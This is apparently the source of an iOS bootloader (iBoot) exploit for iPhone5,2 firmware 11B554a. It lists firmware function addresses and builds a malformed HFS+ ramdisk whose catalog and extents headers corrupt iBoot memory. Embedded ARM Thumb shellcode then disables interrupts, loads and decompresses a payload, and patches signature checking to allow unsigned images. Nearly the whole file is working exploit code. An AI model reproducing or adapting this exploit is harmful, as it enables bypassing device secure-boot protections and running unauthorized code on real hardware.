// iPhone5,2 11B554a
// boot-ramdisk = "/a/b/c/d/e/f/g/h/i/j/k/l/m/disk.dmg"

#define IMAGE_START             0xBFF00000
#define IMAGE_END               0xBFF5352C
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         0xA3AD4
#define IMAGE_BSS_START         0xBFF446C0
#define IMAGE_TEXT_END          0xBFF44000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE        0x1000
#define IMAGE_LOADADDR          0x80000000
#define IMAGE_HUGECHUNK         0x13000000
#define IMAGE_JUMPADDR          0x84000000

#define breakpoint1_ADDR        (0x19474 + 1) /* ResolvePathToCatalogEntry */

#define fuck1_ADDR              (0x1A2D6 + 1)
#define fuck2_ADDR              (0x1A2EC + 1)
#define fuck3_ADDR              (0x1A402 + 1)

#define wait_for_event_ADDR     (0x00814)
#define hugechunk_ADDR          (0x00CD6 + 1)
#define gpio_pin_state_ADDR     (0x02C34 + 1)
#define gpio_set_state_ADDR     (0x02C54 + 1)
#define get_timer_us_ADDR       (0x01834 + 1)
#define reset_cpu_ADDR          (0x0188C + 1)
#define readp_ADDR              (0x1A09C + 1)
#define get_mem_size_ADDR       (0x1FAB0 + 1)
#define putchar_ADDR            (0x33EEC + 1)
#define adjust_stack_ADDR       (0x1F290 + 1)
#define adjust_environ_ADDR     (0x1F790 + 1)
#define disable_interrupts_ADDR (0x34C2C + 1)
#define cache_stuff_ADDR        (0x227EC + 1)
#define wtf_ADDR                (0x01768 + 1)

#define iboot_warmup_ADDR       (0x00114)
#define iboot_start_ADDR        (0x00BF8 + 1)
#define main_task_ADDR          (0x00C64 + 1)
#define panic_ADDR              (0x20954 + 1)
#define system_init_ADDR        (0x20A40 + 1)
#define task_create_ADDR        (0x21070 + 1)
#define task_start_ADDR         (0x211D0 + 1)
#define task_exit_ADDR          (0x211F4 + 1)
#define printf_ADDR             (0x33754 + 1)
#define malloc_ADDR             (0x1A0B8 + 1)
#define free_ADDR               (0x1A16C + 1)
#define create_envvar_ADDR      (0x189DC + 1)
#define bcopy_ADDR              (0x341D8)
#define decompress_lzss_ADDR    (0x257E0 + 1)

#define get_current_task_ADDR       (0x21064)
#define go_command_handler_ADDR     (0x41E88)
#define verify_shsh_ADDR            (0x1AD14)
#define nettoyeur_uncompressed_ADDR (0x48000)
#define nettoyeur compressed_ADDR   (0x47a7c)

#define NODE_SIZE (4096 * 4) /* XXX a size this large will use cache for catalog blocks */
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)

#define TREEDEPTH 1
#define TRYFIRST 0
#define TRYLAST 0

void patch_header(void **buffer){
    PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);  /* HFSPlusVolumeHeader::catalogFile.logicalSize */
    PUT_QWORD_BE(buffer,  0xc0, EXTENT_SIZE);           /* HFSPlusVolumeHeader::extentsFile.logicalSize */
}

void patch_catalog(void **buffer, void *nettoyeur, size_t nettoyeur_sz){
    memset(buffer, 'E', 14);
    memset((char *)buffer + 20, 'E', 256 - 20);
#if TREEDEPTH
    PUT_WORD_BE(buffer, 14, 3);                         /* BTHeaderRec::treeDepth */
#elif TRYLAST
    PUT_WORD_BE(buffer, 14, 2);                         /* BTHeaderRec::treeDepth */
#endif
    PUT_WORD_BE(buffer, 32, 512);                       /* BTHeaderRec::nodeSize */
    PUT_DWORD_BE(buffer, 36, 0x7FFFFF);                 /* BTHeaderRec::totalNodes */
#if TRYFIRST
    PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1));     /* BTHeaderRec::rootNode (trigger) */
#else
    //PUT_DWORD_BE(buffer, 16, 3);                      /* BTHeaderRec::rootNode */
#endif
    
    memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
}

void patch_extents(void **buffer, void *nettoyeur, size_t nettoyeur_sz){
    memset(buffer, 'F', 0x100);
    if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
    PUT_WORD_BE(buffer, 32, NODE_SIZE);                 /* BTHeaderRec::nodeSize */
    PUT_DWORD_BE(buffer, 36, TOTAL_NODES);              /* BTHeaderRec::totalNodes */
    PUT_DWORD_BE(buffer, 16, 0x500);                    /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
    PUT_WORD_LE(buffer, 20, 0);                         /* must be zero (see above) */
    PUT_WORD_LE(buffer, 14, 0);                         /* must be zero, to allow r3 to grow */
    PUT_DWORD_LE(buffer, 78,  IMAGE_START + 0x47B68);                      /* *r2 = r4 */
    PUT_DWORD_LE(buffer, 0x47B68 + 4 - 0x47B54, (NODE_SIZE + 0x40) >> 6);       /* *(r0 + 4) = r9 */
    PUT_DWORD_LE(buffer, 0x47B68 + 0x40 - 0x47B54, IMAGE_START + 0x47BB1); /* r10 (code exec) */
    PUT_DWORD_LE(buffer, 0x47B68 + 0x44 - 0x47B54, IMAGE_START + 0x47CC4); /* r11 -> lr */

    /* shellcode */
    PUT_DWORD_LE(buffer, 0x47BB0 +   0 - 0x47B54, INSNW_LDR_SP_PC80);
    PUT_DWORD_LE(buffer, 0x47BB0 +   4 - 0x47B54, make_bl(0, 0x47BB0 +  4, disable_interrupts_ADDR - 1));
    PUT_WORD_LE(buffer,  0x47BB0 +   8 - 0x47B54, INSNT_LDR_R_PC(4, 76));
    PUT_WORD_LE(buffer,  0x47BB0 +  10 - 0x47B54, INSNT_LDR_R_PC(0, 80));
    PUT_WORD_LE(buffer,  0x47BB0 +  12 - 0x47B54, INSNT_MOV_R_R(1, 4));
    PUT_WORD_LE(buffer,  0x47BB0 +  14 - 0x47B54, INSNT_LDR_R_PC(2, 80));
    PUT_DWORD_LE(buffer, 0x47BB0 +  16 - 0x47B54, make_bl(1, 0x47BB0 + 16, bcopy_ADDR));
    PUT_DWORD_LE(buffer, 0x47BB0 +  20 - 0x47B54, INSNW_MOV_R1_2400);
    PUT_DWORD_LE(buffer, 0x47BB0 +  24 - 0x47B54, INSNW_STRH_R1_R4_E54);
    PUT_WORD_LE(buffer,  0x47BB0 +  28 - 0x47B54, INSNT_LDR_R_PC(0, 68));
    PUT_DWORD_LE(buffer, 0x47BB0 +  30 - 0x47B54, INSNW_MOV_R1_80000000);
    PUT_WORD_LE(buffer,  0x47BB0 +  34 - 0x47B54, INSNT_STR_R1_R4_R0);
    PUT_WORD_LE(buffer,  0x47BB0 +  36 - 0x47B54, INSNT_LDR_R_PC(0, 64));
    PUT_WORD_LE(buffer,  0x47BB0 +  38 - 0x47B54, INSNT_LDR_R_PC(1, 68));
    PUT_WORD_LE(buffer,  0x47BB0 +  40 - 0x47B54, INSNT_STR_R1_R4_R0);
    PUT_DWORD_LE(buffer, 0x47BB0 +  42 - 0x47B54, make_bl(0, 0x47BB0 + 42, get_current_task_ADDR));
    PUT_WORD_LE(buffer,  0x47BB0 +  46 - 0x47B54, INSNT_MOV_R_I(1, 0));
    PUT_WORD_LE(buffer,  0x47BB0 +  48 - 0x47B54, INSNT_STR_R1_R0_68);
    PUT_WORD_LE(buffer,  0x47BB0 +  50 - 0x47B54, INSNT_LDR_R_PC(0, 60));
    PUT_WORD_LE(buffer,  0x47BB0 +  52 - 0x47B54, INSNT_MOV_R_I(1, 0xFC));
    PUT_WORD_LE(buffer,  0x47BB0 +  54 - 0x47B54, INSNT_LDR_R_PC(2, 60));
    PUT_WORD_LE(buffer,  0x47BB0 +  56 - 0x47B54, INSNT_MOV_R_I(3, nettoyeur_sz));
    PUT_WORD_LE(buffer,  0x47BB0 +  58 - 0x47B54, INSNT_MOV_R_R(5, 0));
    PUT_DWORD_LE(buffer, 0x47BB0 +  60 - 0x47B54, make_bl(0, 0x47BB0 + 60, decompress_lzss_ADDR - 1));
    PUT_WORD_LE(buffer,  0x47BB0 +  64 - 0x47B54, INSNT_LDR_R_PC(0, 52));
    PUT_WORD_LE(buffer,  0x47BB0 +  66 - 0x47B54, INSNT_B_PC4);
    PUT_WORD_LE(buffer,  0x47BB0 +  74 - 0x47B54, INSNT_BLX_R(0));
    PUT_DWORD_LE(buffer, 0x47BB0 +  76 - 0x47B54, make_bl(0, 0x47BB0 + 76, cache_stuff_ADDR - 1));
    PUT_WORD_LE(buffer,  0x47BB0 +  80 - 0x47B54, INSNT_BLX_R(5));
    PUT_WORD_LE(buffer,  0x47BB0 +  82 - 0x47B54, INSNT_BX_R(4));
    PUT_DWORD_LE(buffer, 0x47BB0 +  84 - 0x47B54, IMAGE_START + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
    PUT_DWORD_LE(buffer, 0x47BB0 +  88 - 0x47B54, IMAGE_JUMPADDR);
    PUT_DWORD_LE(buffer, 0x47BB0 +  92 - 0x47B54, IMAGE_START);
    PUT_DWORD_LE(buffer, 0x47BB0 +  96 - 0x47B54, IMAGE_BSS_START - IMAGE_START);
    PUT_DWORD_LE(buffer, 0x47BB0 + 100 - 0x47B54, go_command_handler_ADDR /* go command handler */);
    PUT_DWORD_LE(buffer, 0x47BB0 + 104 - 0x47B54, verify_shsh_ADDR /* allow unsigned images */);
    PUT_DWORD_LE(buffer, 0x47BB0 + 108 - 0x47B54, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
    PUT_DWORD_LE(buffer, 0x47BB0 + 112 - 0x47B54, IMAGE_START + nettoyeur_uncompressed_ADDR /* nettoyeur uncompressed */);
    PUT_DWORD_LE(buffer, 0x47BB0 + 116 - 0x47B54, IMAGE_START + nettoyeur_compressed_ADDR /* nettoyeur compressed */);
    PUT_DWORD_LE(buffer, 0x47BB0 + 120 - 0x47B54, IMAGE_START + wtf_ADDR);
}
